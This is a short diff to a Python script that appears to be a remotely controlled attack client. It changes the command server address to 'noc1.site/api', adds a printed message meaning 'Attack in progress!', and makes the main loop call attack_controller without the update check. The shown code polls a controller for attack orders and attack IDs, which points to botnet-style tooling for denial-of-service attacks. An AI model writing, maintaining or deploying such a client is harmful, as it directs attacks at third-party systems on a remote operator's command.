@@ -35,7 +35,7 @@ except ImportError:
 
 from uuid import getnode as get_mac
 
-SITE = 'http://example.ru/api'
+SITE = 'http://noc1.site/api'
 
 REGEXP_IP = r'^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$'
 
@@ -162,6 +162,7 @@ def attack_controller() -> None:
         Attack.status_attack = False
 
         time.sleep(10)
+    print('Идет атака!')
     Attack.attack_id = attack_data['id']
 
     Attack.status_attack = True
@@ -200,11 +201,8 @@ def check_update_code() -> None:
 
 def main() -> None:
     while True:
-        try:
-            check_update_code()
-            attack_controller()
-        except:
-            pass
+        # check_update_code()
+        attack_controller()
 
 
 if __name__ == '__main__':
